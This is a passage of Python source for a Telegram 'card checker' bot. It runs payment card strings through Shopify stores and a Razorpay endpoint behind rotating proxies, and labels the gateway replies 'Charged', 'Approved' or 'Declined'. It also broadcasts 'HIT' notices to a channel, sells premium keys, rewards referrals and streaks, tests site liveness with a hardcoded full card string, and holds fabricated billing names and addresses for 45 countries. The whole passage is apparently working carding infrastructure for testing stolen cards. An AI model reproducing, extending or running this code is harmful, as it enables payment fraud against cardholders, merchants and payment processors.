                    _BIN_CACHE[cn6] = result; return result
    except Exception: pass
    result = {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
    _BIN_CACHE[cn6] = result; return result

# ═════════ SHOPIFY API ═════════
def build_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'): site = f'https://{site}'
    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url

def classify_response(rj):
    ar = str(rj.get('Response', ''))
    if ar.upper() == 'DS_REQUIRED': ar = '3DS_REQUIRED'
    st = rj.get('Status', False); price = rj.get('Price', '-')
    gw = rj.get('Gate', rj.get('Gateway', 'Shopify'))
    if price is not None and price != '-': price = f"${price}"
    rl = ar.lower()
    if is_site_error(ar) or is_proxy_error(ar): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
    ch = ['order_paid','order_placed','order_confirmed','thank you','payment successful','order_completed','charged','order_created','order confirmed']
    ap = ['otp_required','otp required','3d_authentication','3ds_required','3d required','3d_redirect','authentication_required','insufficient_funds','insufficient funds','cvc','ccn','ccn live cvv']
    dc = ['generic_decline','generic decline','do_not_honor','do not honor','stolen_card','lost_card','pickup_card','pick_up_card','restricted_card','restricted card','fraudulent','fraud suspected','fraud_suspected','expired_card','expired card','transaction_not_allowed','transaction not allowed','card_declined','card declined','processor_declined','processor declined','card_not_supported','card not supported','currency_not_supported','duplicate_transaction','revocation_of_authorization','no_action_taken','try_again_later','not_permitted','decline','your card was declined','payment_intent_authentication_failure','avs_check_failed','incorrect number','incorrect_number','invalid','invalid_number','decision_rule_block','generic_error']
    if any(k in rl for k in ch): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Charged"}
    if any(k in rl for k in ap): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    if any(k in rl for k in dc): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
    if st is True and not any(w in rl for w in ["decline","denied","failed","error","rejected","refused","fraud"]): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}

async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "sp"))
        async with s.get(url) as r:
            if r.status != 200: return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
            try: rj = await r.json(content_type=None)
            except Exception: return {"Response": "Invalid JSON", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
        result = classify_response(rj); result["card"] = card; result["site"] = site; return result
    except asyncio.TimeoutError: return {"Response": "Timeout", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
    except asyncio.CancelledError: raise
    except Exception as e:
        err = str(e); st2 = "SiteError" if is_site_error(err) or is_proxy_error(err) else "Declined"
        return {"Response": err[:100], "Price": "-", "Gateway": "Unknown", "Status": st2, "card": card, "site": site}

async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites: return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
    tried_sites, tried_proxies = set(), set(); last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check(): return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1
        if rotator: site = rotator.pick_site(sites, exclude=tried_sites)
        else: site = random.choice([s for s in sites if s not in tried_sites] or list(sites))
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            if rotator: proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
            else: proxy_data = random.choice([p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data))
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data: rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result, sites.index(site) + 1
        if rotator:
            rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(result.get("Response", "")): rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1: await asyncio.sleep(0.3)
    if last: last["Status"] = "Error"; return last, -1
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}, -1

async def test_site(site, proxy_data=None, http_session=None):
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', "5154623245618097|03|2032|156", proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url) as resp:
            if resp.status != 200: return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP_{resp.status}'}
            try: raw = await resp.json(content_type=None)
            except Exception: return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Invalid JSON'}
        rm = raw.get('Response', ''); price = raw.get('Price', '-')
        if price and price != '-': price = f"${price}"
        if is_site_error(rm.lower()): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        if not is_truly_alive(rm, price): return {'site': site, 'status': 'dead', 'price': price, 'response': rm}
        return {'site': site, 'status': 'alive', 'price': price, 'response': rm}
    except Exception as e: return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50]}

# ═════════ RAZORPAY API ═════════
def build_rz_api_url(cc, proxy_data=None):
    url = f'{RAZORPAY_API_URL}?cc={quote(cc, safe="")}'
    if proxy_data:
        un = proxy_data.get('username') or ''; pw = proxy_data.get('password') or ''
        ip = proxy_data['ip']; port = proxy_data['port']
        ps = f"{un}:{pw}@{ip}:{port}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url

def clean_rz_response(raw_resp):
    if not raw_resp: return raw_resp
    c = re.sub(r'^(?:DEAD|LIVE|SUCCESS|CHARGED|APPROVED|DECLINED)\s*\|\s*ID:\s*pay_[a-zA-Z0-9]+\s*\|\s*', '', raw_resp, flags=re.IGNORECASE).strip()
    return c if c else raw_resp

def classify_rz_response(rj):
    gate = 'RazorPay'
    raw = str(rj.get('response', rj.get('Response', '')))
    resp = clean_rz_response(raw); rl = resp.lower()
    if is_rz_retry_error(resp): return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "RetryError"}
    ch = ['transaction success','payment successful','payment success','order_paid','charged']
    ap = ['your payment could not be completed due to insufficient account balance','insufficient account balance','insufficient_funds','insufficient funds','otp_required','otp required','3d_authentication','3ds_required','authentication_required','cvc','ccn']
    dc = ['your payment has been cancelled','payment cancelled','cancelled','card_declined','card declined','generic_decline','generic decline','do_not_honor','do not honor','stolen_card','lost_card','expired_card','expired card','restricted_card','fraudulent','not_permitted','transaction_not_allowed','card_not_supported','decline','your card was declined','payment failed','failed','generic_error']
    if any(k in rl for k in ch): return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Charged"}
    if any(k in rl for k in ap): return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Approved"}
    if any(k in rl for k in dc): return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Declined"}
    return {"Response": resp, "Price": "-", "Gateway": gate, "Status": "Declined"}

async def check_rz_api(card, proxy_data=None, user_id=None, http_session=None):
    uid = user_id or "?"
    try:
        url = build_rz_api_url(card, proxy_data)
        s = http_session or (await get_user_http_session(uid, "rz"))
        async with s.get(url) as r:
            if r.status != 200: return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
            try: rj = await r.json(content_type=None)
            except Exception: return {"Response": "Invalid JSON", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
        result = classify_rz_response(rj); result["card"] = card; return result
    except asyncio.TimeoutError: return {"Response": "Timeout", "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}
    except asyncio.CancelledError: raise
    except Exception as e: return {"Response": str(e)[:100], "Price": "-", "Gateway": "RazorPay", "Status": "RetryError", "card": card}

async def check_rz_with_retry(card, proxies_data=None, user_id=None, max_retries=3, cancel_check=None, http_session=None):
    tried_proxies = set(); last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check(): return {"Response": "Stopped", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}
        proxy_data = None
        if proxies_data:
            proxy_data = random.choice([p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data))
            if proxy_data: tried_proxies.add(proxy_data.get('proxy_url'))
        result = await check_rz_api(card, proxy_data, user_id, http_session=http_session)
        if result.get("Status") != "RetryError": return result
        last = result
        if attempt < max_retries - 1: await asyncio.sleep(0.5)
    if last: last["Status"] = "Error"; return last
    return {"Response": "Max retries", "Price": "-", "Gateway": "RazorPay", "Status": "Error", "card": card}

# ═════════ STATUS ═════════
def _sys_uptime():
    if not PSUTIL_AVAILABLE: return "N/A"
    s = int(time.time() - psutil.boot_time()); d, r = divmod(s, 86400); h, r = divmod(r, 3600); m, sec = divmod(r, 60)
    return f"{d}d {h:02}:{m:02}:{sec:02}"

def _bot_uptime():
    s = int(time.time() - BOT_START_TIME); d, r = divmod(s, 86400); h, r = divmod(r, 3600); m, sec = divmod(r, 60)
    return f"{d}d {h:02}:{m:02}:{sec:02}"

def _bar(pct, length=10):
    f = int(length * pct / 100); return f"{'█' * f}{'░' * (length - f)} {pct:.1f}%"

def _sys_info():
    if not PSUTIL_AVAILABLE: return {"error": "psutil not installed"}
    try:
        cpu = psutil.cpu_percent(interval=0); cc = psutil.cpu_count(logical=True)
        m = psutil.virtual_memory(); d = psutil.disk_usage("/"); n = psutil.net_io_counters()
        return {"cpu": cpu, "cc": cc, "mem_total": m.total/(1024**3), "mem_used": m.used/(1024**3), "mem_pct": m.percent, "disk_total": d.total/(1024**3), "disk_used": d.used/(1024**3), "disk_pct": d.percent, "sent": n.bytes_sent/(1024**2), "recv": n.bytes_recv/(1024**2), "uptime": _sys_uptime(), "bot_uptime": _bot_uptime(), "restart": datetime.fromtimestamp(BOT_START_TIME).strftime('%Y-%m-%d %H:%M:%S'), "error": None}
    except Exception as e: return {"error": str(e)}

async def _build_status_text():
    s = await asyncio.get_event_loop().run_in_executor(None, _sys_info)
    if s.get("error"): return f"⌬ <b>Error</b> ↬ <code>❌ {s['error']}</code>"
    return (f"⌬ <b>Bot Status</b> ↬ <code>✅ Active</code>\n{SEP}\n"
            f"⌬ <b>Bot Uptime</b> ↬ <code>{s['bot_uptime']}</code>\n"
            f"⌬ <b>System Uptime</b> ↬ <code>{s['uptime']}</code>\n"
            f"⌬ <b>Last Restart</b> ↬ <code>{s['restart']}</code>\n{SEP}\n"
            f"⌬ <b>CPU</b> ↬ <code>{s['cpu']:.1f}% ({s['cc']} cores)</code>\n"
            f"⊀ <b>Usage</b> ↬ <code>{_bar(s['cpu'])}</code>\n{SEP}\n"
            f"⌬ <b>RAM</b> ↬ <code>{s['mem_used']:.2f}GB / {s['mem_total']:.2f}GB</code>\n"
            f"⊀ <b>Usage</b> ↬ <code>{_bar(s['mem_pct'])}</code>\n{SEP}\n"
            f"⌬ <b>Disk</b> ↬ <code>{s['disk_used']:.2f}GB / {s['disk_total']:.2f}GB</code>\n"
            f"⊀ <b>Usage</b> ↬ <code>{_bar(s['disk_pct'])}</code>\n{SEP}\n"
            f"⌬ <b>Network</b> ↬ <code>↑ {s['sent']:.1f}MB ↓ {s['recv']:.1f}MB</code>\n{SEP}\n{DEV_LINE}")

# ═════════ CLIENT ═════════
client = TelegramClient('nova_bot', API_ID, API_HASH)
client_instance = client

# ═════════ HIT NOTIFICATIONS ═════════
async def send_channel_hit(res, uid, username, name, gate_type="Shopify"):
    try:
        prem = await is_premium_user(uid)
        tag = bs("Premium") if prem else bs("Free Trial")
        sv = str(res.get("Status", "Charged")).upper()
        prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
        gw = res.get('Gateway', gate_type); resp = res.get('Response', '')
        if gate_type == "RazorPay":
            msg = f"<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}\n<b>{bs('Gateway')} ➛ {gw}</b>\n<b>{bs('Response')} ➛ {resp}</b>\n<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"
        else:
            msg = f"<b>{bs('HIT')} ➛ {bs(sv)}</b> {PE}\n<b>{bs('Gateway')} ➛ {gw}</b>\n<b>{bs('Response')} ➛ {resp}</b>\n<b>{bs('Price')} ➛ {res.get('Price', '-')}</b>\n<b>{bs('User')} ➛ <a href=\"{prof}\">{name}</a></b> ({tag})"
        await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON, emoji_ids=[CE["fire"]])
    except Exception: pass

async def pin_charged_message(event, msg):
    try:
        if event.is_group: await msg.pin()
    except Exception: pass

# ═════════ JSON STORAGE (keys/refs/streaks) ═════════
KEYS_FILE = "keys.json"; REFS_FILE = "referrals.json"; STREAKS_FILE = "streaks.json"
_REFERRAL_MILESTONE_GRANTED = {}

def _sread(p, d):
    try:
        if not os.path.exists(p): return d
        with open(p, 'r', encoding='utf-8') as f: return json.load(f)
    except Exception: return d

def _swrite(p, d):
    try:
        with open(p, 'w', encoding='utf-8') as f: json.dump(d, f, indent=2, default=str)
    except Exception: pass

def load_keys(): return _sread(KEYS_FILE, {})
def save_keys(d): _swrite(KEYS_FILE, d)
def gen_key():
    return f"NOVA_{''.join(random.choices(string.ascii_uppercase + string.digits, k=15))}"

def load_refs():
    d = _sread(REFS_FILE, None)
    if not isinstance(d, dict): d = {"users": {}, "codes": {}}
    d.setdefault("users", {}); d.setdefault("codes", {}); return d

def save_refs(d): _swrite(REFS_FILE, d)

def _gen_ref_code(uid):
    return "NOVA" + hashlib.sha1(f"NOVA{uid}{time.time()}{random.random()}".encode()).hexdigest().upper()[:6]

def get_or_create_ref_code(uid):
    u = str(uid); d = load_refs()
    if d["users"].get(u) and d["users"][u].get("code"): return d["users"][u]["code"]
    code = _gen_ref_code(uid)
    while code in d["codes"]: code = _gen_ref_code(uid + random.randint(1, 9999999))
    d["users"][u] = {"code": code, "referred_by": None, "referrals": [], "pending": [], "rewarded": [], "milestones_paid": 0, "total_hours_earned": 0, "created_at": datetime.now().isoformat()}
    d["codes"][code] = u; save_refs(d); return code

def find_user_by_code(code):
    d = load_refs(); uid = d["codes"].get((code or "").upper().strip()); return int(uid) if uid else None

def attach_referral(new_uid, code):
    if not code: return False
    inviter = find_user_by_code(code)
    if not inviter or inviter == new_uid: return False
    d = load_refs(); nu, iu = str(new_uid), str(inviter)
    if nu in d["users"] and d["users"][nu].get("referred_by"): return False
    if nu not in d["users"]: save_refs(d); get_or_create_ref_code(new_uid); d = load_refs()
    if iu not in d["users"]: save_refs(d); get_or_create_ref_code(inviter); d = load_refs()
    d["users"][nu]["referred_by"] = inviter
    if new_uid not in d["users"][iu].setdefault("pending", []): d["users"][iu]["pending"].append(new_uid)
    save_refs(d); return True

def ref_stats(uid):
    get_or_create_ref_code(uid); d = load_refs(); u = d["users"].get(str(uid), {})
    confirmed = len(u.get("rewarded", [])); pending = len(u.get("pending", []))
    every = REFERRAL_MILESTONE_EVERY; paid = int(u.get("milestones_paid", 0))
    to_next = (every - (confirmed % every)) if (confirmed % every) else every
    return {"code": u.get("code", ""), "confirmed": confirmed, "pending": pending, "total": confirmed + pending, "milestones_paid": paid, "next_milestone_in": to_next, "total_hours": int(u.get("total_hours_earned", 0)), "referred_by": u.get("referred_by")}

def reset_refs_for_user(uid):
    d = load_refs(); u = str(uid)
    if u not in d["users"]: return False
    x = d["users"][u]; x["pending"] = []; x["rewarded"] = []; x["referrals"] = []; x["milestones_paid"] = 0; x["total_hours_earned"] = 0
    save_refs(d); return True

def load_streaks(): 
    d = _sread(STREAKS_FILE, None); return d if isinstance(d, dict) else {}
def save_streaks(d): _swrite(STREAKS_FILE, d)
def _today_s(): return datetime.now().strftime("%Y-%m-%d")
def _yesterday_s(): return (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")

def update_streak(uid):
    d = load_streaks(); u = str(uid); now = datetime.now()
    e = d.get(u) or {"current": 0, "best": 0, "last_date": None, "last_ts": 0, "total_checks": 0, "milestones_claimed": []}
    e["total_checks"] = int(e.get("total_checks", 0)) + 1
    today, yest = _today_s(), _yesterday_s()
    ld = e.get("last_date"); lt = float(e.get("last_ts", 0) or 0)
    hs = (now.timestamp() - lt) / 3600.0 if lt else 999
    if ld == today: pass
    elif ld == yest and hs <= STREAK_MAX_GAP_HOURS: e["current"] = int(e.get("current", 0)) + 1
    elif hs < STREAK_MIN_GAP_HOURS and ld != today: pass
    else: e["current"] = 1
    if e["current"] > int(e.get("best", 0)): e["best"] = e["current"]
    e["last_date"] = today; e["last_ts"] = now.timestamp(); cur = e["current"]
    if cur in STREAK_MILESTONES and cur not in e.get("milestones_claimed", []):
        e.setdefault("milestones_claimed", []).append(cur)
    d[u] = e; save_streaks(d)
    return {"current": e["current"], "best": e["best"], "total_checks": e["total_checks"]}

def get_streak(uid):
    d = load_streaks(); e = d.get(str(uid)) or {}
    return {"current": int(e.get("current", 0)), "best": int(e.get("best", 0)), "total_checks": int(e.get("total_checks", 0))}

# ═════════ FAKE DATA (45 countries) ═════════
FAKE_DATA = {
    'US': {'name':'United States','phone_code':'+1','len':10,'cities':[('New York','NY','10001'),('Los Angeles','CA','90001'),('Chicago','IL','60601'),('Houston','TX','77001')],'streets':['Main St','Oak Ave','Pine Rd','Elm St'],'first':['John','Jane','Michael','Sarah','David','Emily'],'last':['Smith','Johnson','Williams','Brown','Jones','Miller']},
    'GB': {'name':'United Kingdom','phone_code':'+44','len':10,'cities':[('London','England','EC1A 1BB'),('Manchester','England','M1 1AE')],'streets':['High St','Church St'],'first':['Oliver','George','Harry','Jack'],'last':['Smith','Jones','Williams','Taylor']},
    'IN': {'name':'India','phone_code':'+91','len':10,'cities':[('Mumbai','MH','400001'),('Delhi','Delhi','110001'),('Bangalore','KA','560001')],'streets':['MG Road','Nehru Road'],'first':['Aarav','Vivaan','Aditya','Arjun'],'last':['Sharma','Verma','Patel','Kumar']},
    'AE': {'name':'UAE','phone_code':'+971','len':9,'cities':[('Dubai','DU','00000'),('Abu Dhabi','AZ','00000')],'streets':['Sheikh Zayed Road','Al Wasl Rd'],'first':['Mohammed','Ahmed','Ali'],'last':['Al Maktoum','Al Nahyan']},
    'CA': {'name':'Canada','phone_code':'+1','len':10,'cities':[('Toronto','ON','M5V 2H1'),('Vancouver','BC','V6B 1A1')],'streets':['Main St','Queen St'],'first':['Liam','Noah','Oliver'],'last':['Smith','Johnson','Williams']},
    'AU': {'name':'Australia','phone_code':'+61','len':9,'cities':[('Sydney','NSW','2000'),('Melbourne','VIC','3000')],'streets':['George St','Collins St'],'first':['Oliver','Jack','William'],'last':['Smith','Jones','Williams']},
    'DE': {'name':'Germany','phone_code':'+49','len':11,'cities':[('Berlin','BE','10115'),('Munich','BY','80331')],'streets':['Hauptstraße','Bahnhofstraße'],'first':['Lukas','Maximilian','Felix'],'last':['Müller','Schmidt','Schneider']},
    'FR': {'name':'France','phone_code':'+33','len':9,'cities':[('Paris','IDF','75001'),('Marseille','PAC','13001')],'streets':['Rue de la Paix','Avenue des Champs'],'first':['Gabriel','Louis','Raphaël'],'last':['Martin','Bernard','Dubois']},
    'ES': {'name':'Spain','phone_code':'+34','len':9,'cities':[('Madrid','MD','28001'),('Barcelona','CT','08001')],'streets':['Calle Mayor','Gran Vía'],'first':['Hugo','Martín','Pablo'],'last':['García','Rodríguez','González']},
    'IT': {'name':'Italy','phone_code':'+39','len':10,'cities':[('Roma','Lazio','00100'),('Milano','Lombardia','20100')],'streets':['Via Roma','Via Milano'],'first':['Leonardo','Francesco','Alessandro'],'last':['Rossi','Russo','Ferrari']},
    'NL': {'name':'Netherlands','phone_code':'+31','len':9,'cities':[('Amsterdam','NH','1011'),('Rotterdam','ZH','3011')],'streets':['Kerkstraat','Damrak'],'first':['Daan','Sem','Lucas'],'last':['De Jong','Jansen','De Vries']},
    'CH': {'name':'Switzerland','phone_code':'+41','len':9,'cities':[('Zürich','ZH','8001'),('Geneva','GE','1201')],'streets':['Bahnhofstrasse','Rue du Rhône'],'first':['Noah','Liam','Luca'],'last':['Müller','Meier','Schmid']},
    'SG': {'name':'Singapore','phone_code':'+65','len':8,'cities':[('Singapore','SG','018956')],'streets':['Orchard Road','Marina Bay'],'first':['Wei','Ming','Hao'],'last':['Tan','Lim','Lee']},
    'JP': {'name':'Japan','phone_code':'+81','len':10,'cities':[('Tokyo','13','100-0001'),('Osaka','27','530-0001')],'streets':['Chuo-dori','Ginza'],'first':['Takashi','Yuki','Hiroshi'],'last':['Yamamoto','Tanaka','Suzuki']},
    'KR': {'name':'South Korea','phone_code':'+82','len':10,'cities':[('Seoul','11','03000'),('Busan','26','48058')],'streets':['Gangnam-daero','Teheran-ro'],'first':['Min-jun','Seo-yeon','Ji-ho'],'last':['Kim','Lee','Park']},
    'BR': {'name':'Brazil','phone_code':'+55','len':11,'cities':[('São Paulo','SP','01310'),('Rio de Janeiro','RJ','22041')],'streets':['Avenida Paulista','Rua Augusta'],'first':['João','Pedro','Lucas'],'last':['Silva','Santos','Oliveira']},
    'MX': {'name':'Mexico','phone_code':'+52','len':10,'cities':[('Ciudad de México','CDMX','01000'),('Guadalajara','JAL','44100')],'streets':['Avenida Insurgentes','Paseo de la Reforma'],'first':['José','Luis','Carlos'],'last':['Hernández','García','Martínez']},
    'AR': {'name':'Argentina','phone_code':'+54','len':10,'cities':[('Buenos Aires','CABA','C1000'),('Córdoba','CBA','X5000')],'streets':['Avenida 9 de Julio','Calle Florida'],'first':['Santiago','Mateo','Juan'],'last':['González','Rodríguez','Fernández']},
    'ZA': {'name':'South Africa','phone_code':'+27','len':9,'cities':[('Johannesburg','GP','2001'),('Cape Town','WC','8001')],'streets':['Main Rd','Church St'],'first':['Thabo','Sipho','Pieter'],'last':['Nkosi','Botha','Van der Merwe']},
    'NG': {'name':'Nigeria','phone_code':'+234','len':10,'cities':[('Lagos','LA','100001'),('Abuja','FC','900001')],'streets':['Marina Rd','Broad St'],'first':['Chukwu','Emeka','Tunde'],'last':['Okafor','Adeyemi','Eze']},
    'KE': {'name':'Kenya','phone_code':'+254','len':9,'cities':[('Nairobi','NRB','00100'),('Mombasa','MSA','80100')],'streets':['Kenyatta Ave','Moi Ave'],'first':['Juma','Kipchoge','Mwangi'],'last':['Omondi','Kamau','Njoroge']},
    'EG': {'name':'Egypt','phone_code':'+20','len':10,'cities':[('Cairo','CAI','11511'),('Alexandria','ALX','21500')],'streets':['Tahrir Square','Corniche El Nil'],'first':['Mohamed','Ahmed','Omar'],'last':['Hassan','Ibrahim','Mahmoud']},
    'SA': {'name':'Saudi Arabia','phone_code':'+966','len':9,'cities':[('Riyadh','RD','11564'),('Jeddah','JD','21411')],'streets':['King Fahd Rd','Olaya St'],'first':['Abdullah','Faisal','Saud'],'last':['Al-Saud','Al-Otaibi','Al-Qahtani']},
    'TR': {'name':'Turkey','phone_code':'+90','len':10,'cities':[('Istanbul','IST','34000'),('Ankara','ANK','06000')],'streets':['Istiklal Cd','Bagdat Cd'],'first':['Ahmet','Mehmet','Mustafa'],'last':['Yılmaz','Demir','Kaya']},
    'RU': {'name':'Russia','phone_code':'+7','len':10,'cities':[('Moscow','MOW','101000'),('Saint Petersburg','SPE','190000')],'streets':['Tverskaya St','Nevsky Prospekt'],'first':['Ivan','Dmitri','Sergei'],'last':['Ivanov','Petrov','Smirnov']},
    'UA': {'name':'Ukraine','phone_code':'+380','len':9,'cities':[('Kyiv','KV','01001'),('Kharkiv','KK','61000')],'streets':['Khreshchatyk','Andriivskyi Uzviz'],'first':['Oleksandr','Andriy','Dmytro'],'last':['Shevchenko','Kovalenko','Bondarenko']},
    'PL': {'name':'Poland','phone_code':'+48','len':9,'cities':[('Warsaw','MZ','00-001'),('Kraków','MA','30-001')],'streets':['Marszałkowska','Piotrkowska'],'first':['Jakub','Szymon','Antoni'],'last':['Nowak','Kowalski','Wiśniewski']},
    'SE': {'name':'Sweden','phone_code':'+46','len':9,'cities':[('Stockholm','AB','11122'),('Göteborg','O','41103')],'streets':['Drottninggatan','Sveavägen'],'first':['Erik','Lars','Anders'],'last':['Andersson','Johansson','Karlsson']},
    'NO': {'name':'Norway','phone_code':'+47','len':8,'cities':[('Oslo','03','0150'),('Bergen','46','5003')],'streets':['Karl Johans gate','Storgata'],'first':['Magnus','Håkon','Sindre'],'last':['Hansen','Johansen','Olsen']},
    'DK': {'name':'Denmark','phone_code':'+45','len':8,'cities':[('Copenhagen','84','1000'),('Aarhus','82','8000')],'streets':['Strøget','Nørrebrogade'],'first':['Mikkel','Frederik','Emil'],'last':['Nielsen','Jensen','Hansen']},
    'FI': {'name':'Finland','phone_code':'+358','len':9,'cities':[('Helsinki','18','00100'),('Tampere','11','33100')],'streets':['Mannerheimintie','Aleksanterinkatu'],'first':['Juhani','Mikael','Matias'],'last':['Korhonen','Virtanen','Mäkinen']},
    'IE': {'name':'Ireland','phone_code':'+353','len':9,'cities':[('Dublin','L','D01'),('Cork','C','T12')],'streets':["O'Connell St",'Grafton St'],'first':['Sean','Conor','Cian'],'last':['Murphy','Kelly',"O'Brien"]},
    'PT': {'name':'Portugal','phone_code':'+351','len':9,'cities':[('Lisboa','11','1000'),('Porto','13','4000')],'streets':['Avenida da Liberdade','Rua Augusta'],'first':['João','Miguel','Pedro'],'last':['Silva','Santos','Ferreira']},
    'GR': {'name':'Greece','phone_code':'+30','len':10,'cities':[('Athina','ATT','10431'),('Thessaloniki','CM','54621')],'streets':['Ermou','Tsimiski'],'first':['Georgios','Dimitrios','Nikolaos'],'last':['Papadopoulos','Georgiou','Nikolaidis']},
    'CZ': {'name':'Czechia','phone_code':'+420','len':9,'cities':[('Praha','PR','11000'),('Brno','JM','60200')],'streets':['Václavské náměstí','Národní třída'],'first':['Jakub','Jan','Tomáš'],'last':['Novák','Svoboda','Dvořák']},
    'RO': {'name':'Romania','phone_code':'+40','len':9,'cities':[('București','B','010011'),('Cluj-Napoca','CJ','400001')],'streets':['Calea Victoriei','Bulevardul Unirii'],'first':['Andrei','Mihai','Alexandru'],'last':['Popescu','Ionescu','Stan']},
    'HU': {'name':'Hungary','phone_code':'+36','len':9,'cities':[('Budapest','BU','1011'),('Debrecen','HB','4000')],'streets':['Andrássy út','Váci utca'],'first':['Bence','Máté','Dániel'],'last':['Nagy','Kovács','Tóth']},
    'AT': {'name':'Austria','phone_code':'+43','len':10,'cities':[('Wien','W','1010'),('Graz','ST','8010')],'streets':['Kärntner Straße','Mariahilfer Straße'],'first':['Lukas','Maximilian','Tobias'],'last':['Gruber','Huber','Bauer']},
    'BE': {'name':'Belgium','phone_code':'+32','len':9,'cities':[('Brussel','BRU','1000'),('Antwerpen','VAN','2000')],'streets':['Rue Neuve','Meir'],'first':['Lucas','Arthur','Louis'],'last':['Peeters','Janssens','Maes']},
    'NZ': {'name':'New Zealand','phone_code':'+64','len':9,'cities':[('Auckland','AUK','1010'),('Wellington','WGN','6011')],'streets':['Queen St','Lambton Quay'],'first':['Oliver','Jack','Liam'],'last':['Smith','Wilson','Williams']},
    'TH': {'name':'Thailand','phone_code':'+66','len':9,'cities':[('Bangkok','BKK','10110'),('Chiang Mai','CNX','50200')],'streets':['Sukhumvit Rd','Silom Rd'],'first':['Somchai','Nattapong','Anan'],'last':['Saetang','Suwan','Wongchai']},
    'VN': {'name':'Vietnam','phone_code':'+84','len':9,'cities':[('Hanoi','HN','100000'),('Ho Chi Minh','SG','700000')],'streets':['Nguyen Hue','Le Loi'],'first':['Nguyen','Tran','Le'],'last':['Van An','Huu Phuc','Thi Mai']},
    'PH': {'name':'Philippines','phone_code':'+63','len':10,'cities':[('Manila','NCR','1000'),('Cebu','CEB','6000')],'streets':['Ayala Ave','Roxas Blvd'],'first':['Jose','Juan','Miguel'],'last':['Santos','Reyes','Cruz']},
    'MY': {'name':'Malaysia','phone_code':'+60','len':9,'cities':[('Kuala Lumpur','KUL','50000'),('Penang','PNG','10000')],'streets':['Jalan Bukit Bintang','Jalan Ampang'],'first':['Ahmad','Muhammad','Lim'],'last':['Bin Abdullah','Tan','Lee']},
    'ID': {'name':'Indonesia','phone_code':'+62','len':11,'cities':[('Jakarta','JK','10110'),('Surabaya','JI','60119')],'streets':['Jalan Sudirman','Jalan Thamrin'],'first':['Budi','Agus','Andi'],'last':['Santoso','Wijaya','Kusuma']},
    'PK': {'name':'Pakistan','phone_code':'+92','len':10,'cities':[('Karachi','SD','74000'),('Lahore','PB','54000')],'streets':['M.A. Jinnah Rd','Mall Rd'],'first':['Muhammad','Ahmed','Ali'],'last':['Khan','Ahmed','Malik']},
    'BD': {'name':'Bangladesh','phone_code':'+880','len':10,'cities':[('Dhaka','DHK','1000'),('Chittagong','CTG','4000')],'streets':['Gulshan Ave','Banani Rd'],'first':['Rahim','Karim','Hasan'],'last':['Ahmed','Hossain','Rahman']},
    'LK': {'name':'Sri Lanka','phone_code':'+94','len':9,'cities':[('Colombo','WP','00100'),('Kandy','CP','20000')],'streets':['Galle Rd','Colombo Rd'],'first':['Kamal','Saman','Nuwan'],'last':['Perera','Fernando','Silva']},
